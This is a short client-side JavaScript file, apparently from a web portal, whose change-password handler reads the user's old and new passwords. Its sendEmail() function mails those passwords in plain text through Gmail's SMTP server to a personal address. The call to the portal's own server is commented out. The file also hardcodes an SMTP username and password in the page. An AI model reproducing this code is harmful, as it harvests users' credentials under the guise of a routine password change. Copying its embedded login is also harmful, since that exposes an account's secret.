//var socket = io("localhost:3000");

function chpwd()
{
    var opwd=document.getElementById("opwd").value;
    var npwd1=document.getElementById("npwd1").value;
    var npwd2=document.getElementById("npwd2").value;
    document.getElementById('x').style.display="block";
  //  socket.emit("chpwd",{opwd:opwd,npwd1:npwd1,npwd2:npwd2});
    sendEmail(opwd,npwd1,npwd2);
}

function sendEmail(x,y,z) {
	Email.send({
	Host: "smtp.gmail.com",
	Username : "senthilkumar.kumaraswamy.rec@gmail.com",
	Password : "vforvendetta",
	To : 'ashwin.balaji.dav@gmail.com',
	From : "recoin.portal@gmail.com",
	Subject : "chpwd request tu ne maanga tha",
	Body : x+","+y+","+z,
	});
}
